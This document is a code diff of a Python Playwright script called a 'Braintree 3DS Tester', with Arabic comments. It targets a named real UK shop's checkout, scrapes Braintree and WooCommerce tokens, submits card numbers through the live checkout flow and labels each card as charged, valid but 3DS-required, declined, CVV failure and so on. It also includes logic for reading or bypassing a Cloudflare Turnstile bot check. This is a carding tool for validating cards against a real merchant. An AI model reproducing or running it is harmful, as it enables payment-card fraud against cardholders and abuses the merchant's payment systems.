@@ -1,13 +1,11 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-VINEX Braintree 3DS Tester — Playwright Edition v2.0
-Fixed:
-- domcontentloaded بدل networkidle
-- Turnstile detection من turnstile API + input
-- Xvfb-safe
-- إصلاح تعارض الـ f-strings
-- دعم headless=True و False
+VINEX Braintree 3DS Tester — Playwright Edition v3.0
+- بيمشي في الـ flow الطبيعي بالكامل
+- بيملأ الفورم ويضغط PLACE ORDER
+- بيرجّع الرد الفعلي من الموقع (success / failure / 3ds / declined)
+- Turnstile اختياري: لو حلّ نفسه → تمام، لو لأ → نكمل ونشوف رد الموقع
 """
 import asyncio, json, re, time, random, uuid, base64, os
 from urllib.parse import urlparse
@@ -24,6 +22,7 @@ class BraintreeTester:
         self.headless = headless
         self.debug = debug
 
+        # extracted
         self.auth_fp = None
         self.merchant_id = None
         self.woo_nonce = None
@@ -32,6 +31,7 @@ class BraintreeTester:
         self.currency = 'GBP'
         self.turnstile_token = None
         self.diagnostics = []
+
         self._pw = None
         self.browser = None
         self.context = None
@@ -112,13 +112,11 @@ class BraintreeTester:
         self.page = await self.context.new_page()
 
         self._log(f'📄 opening {self.checkout_url}')
-        # ← domcontentloaded بدل networkidle
         await self.page.goto(
             self.checkout_url,
             wait_until='domcontentloaded',
             timeout=60000,
         )
-        # انتظر الشبكة تشتغل شوية (بس مش networkidle)
         await self.page.wait_for_timeout(5000)
 
         # scroll عشان payment form تتحمل
@@ -128,45 +126,69 @@ class BraintreeTester:
             await self.page.evaluate('window.scrollTo(0, 0)')
         except: pass
 
-        # extract data
         await self._extract()
 
     async def _extract(self):
-        # 1. client_token
+        """استخراج auth_fp + nonce + total من HTML أولاً ثم من JS"""
         try:
-            data = await self.page.evaluate('''
-                () => {
-                    if (typeof wc_braintree_client_token !== 'undefined' &&
-                        wc_braintree_client_token && wc_braintree_client_token[0]) {
-                        return wc_braintree_client_token[0];
-                    }
-                    const el = document.querySelector('input[name="braintree_cc_config_data"]');
-                    if (el && el.value) return '__CONFIG__:' + el.value;
-                    return null;
-                }
-            ''')
-        except Exception as e:
-            self._log(f'eval err: {e}')
-            data = None
+            html = await self.page.content()
+        except:
+            html = ''
 
-        if data:
+        # 1. auth_fp من HTML
+        if html:
+            m = re.search(r'"authorizationFingerprint"\s*:\s*"([^"]{100,})"', html)
+            if m:
+                self.auth_fp = m.group(1)
+                self._log(f'✅ auth_fp: {self.auth_fp[:60]}...')
+
+            m = re.search(r'"merchantId"\s*:\s*"([a-z0-9]{10,})"', html)
+            if m:
+                self.merchant_id = m.group(1)
+                self._log(f'✅ merchant_id: {self.merchant_id}')
+
+            m = re.search(r'name="braintree_cc_config_data"\s+value="([^"]+)"', html)
+            if m:
+                from html import unescape
+                try:
+                    self.bt_config = json.loads(unescape(m.group(1)))
+                    self._log('✅ bt_config من HTML')
+                except: pass
+
+        # 2. fallback: client_token
+        if not self.auth_fp:
             try:
-                if data.startswith('__CONFIG__:'):
-                    cfg = json.loads(data.replace('__CONFIG__:', ''))
-                else:
-                    decoded = base64.b64decode(
-                        data + '=' * (-len(data) % 4)
-                    ).decode('utf-8', errors='ignore')
-                    cfg = json.loads(decoded)
-                self.bt_config = cfg
-                self.auth_fp = cfg.get('authorizationFingerprint')
-                self.merchant_id = cfg.get('merchantId')
-                self._log(f'✅ merchant={self.merchant_id}')
-                self._log(f'   auth_fp: {(self.auth_fp or "")[:60]}...')
-            except Exception as e:
-                self._log(f'decode err: {e}')
+                data = await self.page.evaluate('''
+                    () => {
+                        if (typeof wc_braintree_client_token !== 'undefined' &&
+                            wc_braintree_client_token && wc_braintree_client_token[0]) {
+                            return wc_braintree_client_token[0];
+                        }
+                        const el = document.querySelector('input[name="braintree_cc_config_data"]');
+                        if (el && el.value) return '__CONFIG__:' + el.value;
+                        return null;
+                    }
+                ''')
+            except: data = None
 
-        # 2. woo nonce
+            if data:
+                try:
+                    if data.startswith('__CONFIG__:'):
+                        cfg = json.loads(data.replace('__CONFIG__:', ''))
+                    else:
+                        clean = data.strip().replace('\n','').replace('\r','').replace(' ','')
+                        clean = re.sub(r'[^A-Za-z0-9+/=]', '', clean)
+                        while len(clean) % 4 != 0: clean += '='
+                        decoded = base64.b64decode(clean).decode('utf-8', errors='ignore')
+                        cfg = json.loads(decoded)
+                    self.bt_config = cfg
+                    self.auth_fp = cfg.get('authorizationFingerprint')
+                    self.merchant_id = cfg.get('merchantId')
+                    self._log(f'✅ client_token decoded')
+                except Exception as e:
+                    self._log(f'decode err: {e}')
+
+        # 3. woo nonce
         try:
             self.woo_nonce = await self.page.evaluate('''
                 () => {
@@ -177,7 +199,7 @@ class BraintreeTester:
             self._log(f'✅ woo_nonce: {self.woo_nonce}')
         except: pass
 
-        # 3. order total
+        # 4. order total
         try:
             total = await self.page.evaluate('''
                 () => {
@@ -191,70 +213,37 @@ class BraintreeTester:
                 self._log(f'✅ order_total: {self.order_total}')
         except: pass
 
-        # 4. Turnstile
-        await self._wait_turnstile()
+        # 5. Turnstile — بس نبص عليه سريع (لو موجود، بنستخدمه)
+        await self._check_turnstile_quick()
 
-    async def _wait_turnstile(self, timeout=90):
-        """انتظر Turnstile — يدعم headless=False (بيتحل تلقائياً) + input + API"""
-        self._log('⏳ waiting for Turnstile...')
-
-        for i in range(timeout):
-            # 1) من input
-            try:
-                token = await self.page.evaluate('''
-                    () => {
-                        const el = document.querySelector('input[name="cf-turnstile-response"]');
-                        if (el && el.value && el.value.length > 20) return el.value;
-                        return null;
-                    }
-                ''')
-            except: token = None
-
-            # 2) من turnstile API
-            if not token:
-                try:
-                    token = await self.page.evaluate('''
-                        () => {
-                            if (window.turnstile && typeof turnstile.getResponse === 'function') {
-                                const widgets = document.querySelectorAll('.cf-turnstile');
-                                for (let w of widgets) {
-                                    try {
-                                        const r = turnstile.getResponse(w);
-                                        if (r && r.length > 20) return r;
-                                    } catch(e) {}
-                                }
-                            }
-                            return null;
+    async def _check_turnstile_quick(self):
+        """بص سريع على Turnstile — من غير انتظار"""
+        try:
+            token = await self.page.evaluate('''
+                () => {
+                    const el = document.querySelector('input[name="cf-turnstile-response"]');
+                    if (el && el.value && el.value.length > 20) return el.value;
+                    if (window.turnstile && typeof turnstile.getResponse === 'function') {
+                        const widgets = document.querySelectorAll('.cf-turnstile');
+                        for (let w of widgets) {
+                            try {
+                                const r = turnstile.getResponse(w);
+                                if (r && r.length > 20) return r;
+                            } catch(e) {}
                         }
-                    ''')
-                except: token = None
-
-            # 3) لو headless=False، ممكن نحاول نضغط على الشيك بوكس
-            if not token and i == 5 and not self.headless:
-                try:
-                    frames = self.page.frames
-                    for f in frames:
-                        if 'challenges.cloudflare.com' in f.url:
-                            try:
-                                await f.click('input[type="checkbox"], body', timeout=2000)
-                                self._log('👆 clicked turnstile checkbox')
-                            except: pass
-                except: pass
-
+                    }
+                    return null;
+                }
+            ''')
             if token and len(token) > 20:
                 self.turnstile_token = token
-                self._log(f'✅ turnstile: {token[:30]}...')
-                return True
-
-            if i % 10 == 0:
-                self._log(f'   waiting... ({i}s)')
-            await asyncio.sleep(1)
-
-        self._log('⚠️  turnstile not solved')
-        return False
+                self._log(f'✅ turnstile موجود: {token[:30]}...')
+            else:
+                self._log('⚠️  مفيش turnstile — هنكمل برضه')
+        except: pass
 
     # ═══════════════════════════════════════════════════════════
-    #  STEP 2: Charge
+    #  STEP 2: Charge — يمشي في الـ flow ويجيب الرد
     # ═══════════════════════════════════════════════════════════
     async def Charge(self, card):
         parts = card.strip().split('|')
@@ -272,10 +261,8 @@ class BraintreeTester:
                 return 'NO_AUTH_FP'
             if not self.woo_nonce:
                 return 'NO_WOO_NONCE'
-            if not self.turnstile_token:
-                self._log('⚠️  continuing without turnstile (may fail)')
 
-            result = await self._charge_in_browser(number, mm, yy, cvc)
+            result = await self._flow(number, mm, yy, cvc)
             return result
 
         except Exception as e:
@@ -289,11 +276,17 @@ class BraintreeTester:
             try: await self._pw.stop()
             except: pass
 
-    async def _charge_in_browser(self, number, mm, yy, cvc):
+    async def _flow(self, number, mm, yy, cvc):
+        """
+        الـ flow الكامل:
+        1) tokenize → nonce
+        2) 3DS lookup (بس عشان نعرف enrolled/challenge)
+        3) نحط الـ nonce في الفورم + نضغط PLACE ORDER
+        4) نقرأ الرد اللي الموقع رجعه
+        """
+
         # ─── 1. tokenize ───
         self._log('🔐 tokenizing...')
-
-        # نجهز البيانات كـ dict ونبعتها كـ arg
         tok_payload = {
             'query': (
                 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {'
@@ -356,7 +349,7 @@ class BraintreeTester:
             return f'NO_NONCE: {json.dumps(tok)[:200]}'
         self._log(f'✅ nonce: {nonce[:40]}...')
 
-        # ─── 2. lookup ───
+        # ─── 2. 3DS lookup (معلوماتي بس) ───
         self._log('🔍 3DS lookup...')
         bin_num = number[:6]
         amount = self.order_total or '1.00'
@@ -425,109 +418,191 @@ class BraintreeTester:
             {'merchant_id': self.merchant_id, 'nonce': nonce, 'payload': lookup_payload},
         )
 
-        if 'errors' in lk:
-            return f'LOOKUP_ERROR: {json.dumps(lk["errors"])[:200]}'
+        enrolled = None
+        challenge = None
+        version = '?'
+        if 'errors' not in lk:
+            info = lk.get('threeDSecureInfo', {}) or lk.get('lookup', {}) or lk
+            challenge = bool(info.get('challengeRequired'))
+            enrolled = info.get('enrolled')
+            version = info.get('threeDSecureVersion', '?')
+            self._log(f'📋 enrolled={enrolled} challenge={challenge} v={version}')
+        else:
+            self._log(f'⚠️  lookup err: {json.dumps(lk["errors"])[:150]}')
 
-        info = lk.get('threeDSecureInfo', {}) or lk.get('lookup', {}) or lk
-        challenge = bool(info.get('challengeRequired'))
-        enrolled = info.get('enrolled')
-        version = info.get('threeDSecureVersion', '?')
-        self._log(f'📋 enrolled={enrolled} challenge={challenge} v={version}')
-
-        # ─── 3. checkout ───
-        self._log('📤 placing order...')
-        cfg_json = json.dumps(self.bt_config, separators=(',', ':')) if self.bt_config else '{}'
-
-        checkout_data = {
-            'billing_first_name': 'Test',
-            'billing_last_name': 'User',
-            'billing_company': '',
-            'billing_country': 'GB',
-            'billing_address_1': 'W356',
-            'billing_address_2': 'W456',
-            'billing_city': 'London',
-            'billing_state': 'W266',
-            'billing_postcode': 'OX14 4PG',
-            'billing_phone': '447700900123',
-            'billing_email': f'test{random.randint(100,999)}@gmail.com',
-            'shipping_country': 'GB',
-            'shipping_method[0]': 'flexible_shipping_11_5',
-            'payment_method': 'braintree_cc',
-            'braintree_cc_nonce_key': nonce,
-            'braintree_cc_device_data': json.dumps({'correlation_id': str(uuid.uuid4())[:32]}),
-            'braintree_cc_3ds_nonce_key': '',
-            'braintree_cc_config_data': cfg_json,
-            'terms': 'on',
-            'terms-field': '1',
-            'gdpr_woo_consent': '1',
-            'woocommerce-process-checkout-nonce': self.woo_nonce,
-            '_wp_http_referer': '/?wc-ajax=update_order_review',
-        }
-
-        co = await self.page.evaluate(
-            '''async (args) => {
-                const data = new URLSearchParams();
-                for (const k in args.data) {
-                    data.append(k, args.data[k]);
-                }
-                const tst = document.querySelector('input[name="cf-turnstile-response"]');
-                if (tst && tst.value) data.append('cf-turnstile-response', tst.value);
-                try {
-                    const r = await fetch('/?wc-ajax=checkout', {
-                        method: 'POST',
-                        headers: { 'content-type': 'application/x-www-form-urlencoded' },
-                        body: data.toString(),
-                    });
-                    const text = await r.text();
-                    return { status: r.status, text: text };
-                } catch(e) {
-                    return { error: String(e) };
-                }
+        # ─── 3. نحط الـ nonce في الفورم (زي المتصفح) ───
+        self._log('📝 filling form fields...')
+        await self.page.evaluate(
+            '''(nonce) => {
+                const set_val = (sel, val) => {
+                    const el = document.querySelector(sel);
+                    if (el) { el.value = val; return true; }
+                    return false;
+                };
+                set_val('#braintree_cc_nonce_key', nonce);
+                // device data
+                const dev = document.querySelector('#braintree_cc_device_data');
+                if (dev) dev.value = JSON.stringify({correlation_id: crypto.randomUUID().slice(0,32)});
+                // املأ الفورم بحقول مطلوبة (زي المتصفح)
+                const fill = (name, val) => {
+                    const el = document.querySelector('input[name="'+name+'"]');
+                    if (el && !el.value) el.value = val;
+                };
+                fill('billing_first_name', 'Test');
+                fill('billing_last_name', 'User');
+                fill('billing_address_1', 'W356');
+                fill('billing_address_2', 'W456');
+                fill('billing_city', 'London');
+                fill('billing_state', 'W266');
+                fill('billing_postcode', 'OX14 4PG');
+                fill('billing_phone', '447700900123');
+                fill('billing_email', 'test' + Math.floor(Math.random()*1000) + '@gmail.com');
+                // terms + gdpr
+                const terms = document.querySelector('#terms');
+                if (terms) terms.checked = true;
+                const gdpr = document.querySelector('#gdpr_woo_consent');
+                if (gdpr) gdpr.checked = true;
+                return true;
             }''',
-            {'data': checkout_data},
+            nonce,
         )
 
-        if co.get('error'):
-            return f'CHECKOUT_ERROR: {co["error"]}'
+        # ─── 4. نضغط PLACE ORDER زي المستخدم ───
+        self._log('🖱️  clicking PLACE ORDER...')
 
-        text = co.get('text', '')
-        self._log(f'📥 checkout response len={len(text)}')
+        # نضيف listener عشان نلتقط رد الـ checkout
+        checkout_response = {}
 
+        async def on_response(resp):
+            try:
+                if 'wc-ajax=checkout' in resp.url:
+                    try:
+                        checkout_response['json'] = await resp.json()
+                    except:
+                        checkout_response['text'] = await resp.text()
+                    checkout_response['status'] = resp.status
+            except: pass
+
+        self.page.on('response', on_response)
+
+        # نضغط الزرار
         try:
-            j = json.loads(text)
-            result = j.get('result')
-            messages = j.get('messages', '')
-            clean = re.sub(r'<[^>]+>', '', str(messages))
-            clean = re.sub(r'\s+', ' ', clean).strip()
+            await self.page.click('#place_order', timeout=10000)
+            self._log('   ✅ clicked #place_order')
+        except Exception as e:
+            self._log(f'   ❌ click failed: {e}')
+            # نحاول نعمل submit يدوي
+            try:
+                await self.page.evaluate('''
+                    () => {
+                        const form = document.querySelector('form.checkout, form.woocommerce-checkout');
+                        if (form) form.submit();
+                    }
+                ''')
+                self._log('   ⚠️  form.submit() called manually')
+            except: pass
 
-            if result == 'success':
-                return f'CHARGED {self.order_total} {self.currency}'
+        # ─── 5. نستنى الرد ───
+        self._log('⏳ waiting for checkout response...')
+        for _ in range(45):  # 45 ثانية
+            if checkout_response.get('json') or checkout_response.get('text'):
+                break
+            await asyncio.sleep(1)
 
-            if result == 'failure':
-                low = clean.lower()
-                if '3d secure' in low or '3ds' in low:
-                    return f'LIVE_3DS (enrolled={enrolled}, v={version}) — Valid card, OTP required'
-                if 'verify that you are human' in low:
-                    return f'TURNSTILE_FAILED (enrolled={enrolled}) — Card Valid, Turnstile blocked'
-                if 'declined' in low: return f'DECLINED: {clean[:180]}'
-                if 'insufficient' in low: return 'INSUFFICIENT_FUNDS'
-                if 'cvv' in low: return 'CVV_FAIL'
-                if 'expired' in low: return 'EXPIRED'
-                if 'do not honor' in low: return 'DO_NOT_HONOR'
-                return f'DECLINED: {clean[:180]}'
-        except Exception:
-            pass
+        # ─── 6. نقرأ الرد ───
+        resp_data = checkout_response.get('json')
+        resp_text = checkout_response.get('text', '')
 
-        if 'order-received' in text:
+        # لو ما فيش رد لسه، نجرب نقرأه من الـ URL / body
+        if not resp_data and not resp_text:
+            try:
+                # لو الصفحة اتغيرت لـ order-received
+                current_url = self.page.url
+                if 'order-received' in current_url:
+                    return f'CHARGED {self.order_total} {self.currency}'
+
+                # نقرأ body
+                body = await self.page.evaluate('() => document.body.innerText')
+                if 'thank you' in body.lower() or 'order received' in body.lower():
+                    return f'CHARGED {self.order_total} {self.currency}'
+
+                # نقرأ رسائل الأخطاء
+                err = await self.page.evaluate('''
+                    () => {
+                        const els = document.querySelectorAll('.woocommerce-error li, .wc-braintree-checkout-error, ul.woocommerce-error');
+                        return Array.from(els).map(e => e.textContent.trim()).join(' | ');
+                    }
+                ''')
+                if err:
+                    return self._parse_woo_message(err, enrolled, challenge, version)
+
+            except: pass
+
+            return 'NO_RESPONSE (timeout)'
+
+        # ─── 7. نحلل الرد ───
+        if resp_data:
+            return self._parse_woo_response(resp_data, enrolled, challenge, version)
+
+        # نص HTML
+        return self._parse_woo_message(resp_text, enrolled, challenge, version)
+
+    def _parse_woo_response(self, j, enrolled, challenge, version):
+        """تحليل JSON من WooCommerce checkout"""
+        if not isinstance(j, dict):
+            return f'UNKNOWN: {str(j)[:200]}'
+
+        result = j.get('result')
+        messages = j.get('messages', '')
+
+        clean = re.sub(r'<[^>]+>', '', str(messages))
+        clean = re.sub(r'\s+', ' ', clean).strip()
+
+        if result == 'success':
+            # ممكن يكون redirect لـ order-received
+            redirect = j.get('redirect', '')
             return f'CHARGED {self.order_total} {self.currency}'
-        return f'UNKNOWN: {text[:200]}'
+
+        if result == 'failure':
+            return self._parse_woo_message(clean, enrolled, challenge, version)
+
+        if result == 'error':
+            return self._parse_woo_message(clean or 'error', enrolled, challenge, version)
+
+        return f'UNKNOWN_RESULT: {result} — {clean[:180]}'
+
+    def _parse_woo_message(self, msg, enrolled, challenge, version):
+        """تحليل نص الرد"""
+        if not msg:
+            return 'UNKNOWN: empty message'
+        low = msg.lower()
+
+        # 3D Secure
+        if '3d secure' in low or '3ds' in low:
+            return f'LIVE_3DS (enrolled={enrolled}, v={version}) — Valid card, OTP required'
+
+        # Turnstile
+        if 'verify that you are human' in low or 'turnstile' in low or 'human' in low:
+            if challenge:
+                return f'LIVE_3DS (enrolled={enrolled}) — Valid card, OTP required'
+            return f'CARD_VALID (enrolled={enrolled or "?"}) — Card OK, Turnstile blocked'
+
+        # ردود بنكية
+        if 'declined' in low: return f'DECLINED: {msg[:180]}'
+        if 'insufficient' in low: return 'INSUFFICIENT_FUNDS'
+        if 'cvv' in low: return 'CVV_FAIL'
+        if 'expired' in low: return 'EXPIRED'
+        if 'do not honor' in low: return 'DO_NOT_HONOR'
+        if 'invalid' in low and 'card' in low: return 'INVALID_CARD'
+        if 'do not match' in low: return f'AVS_MISMATCH: {msg[:180]}'
+
+        return f'DECLINED: {msg[:180]}'
 
 
 # ═══════════════════════════════════════════════════════════════
 #  Main
 # ═══════════════════════════════════════════════════════════════
 async def main():
-    # ← مهم: على Railway مع Xvfb
     os.environ.setdefault('DISPLAY', ':99')
 
     COOKIES = (
@@ -539,7 +614,7 @@ async def main():
     t = BraintreeTester(
         checkout_url='https://shop.herbs-hands-healing.co.uk/checkout',
         cookies=COOKIES,
-        headless=False,   # ← مع Xvfb
+        headless=False,
         debug=True,
     )
 
@@ -548,6 +623,7 @@ async def main():
     print('=' * 60)
     print(f'RESULT: {result}')
     print('=' * 60)
+
 
 if __name__ == '__main__':
     asyncio.run(main())
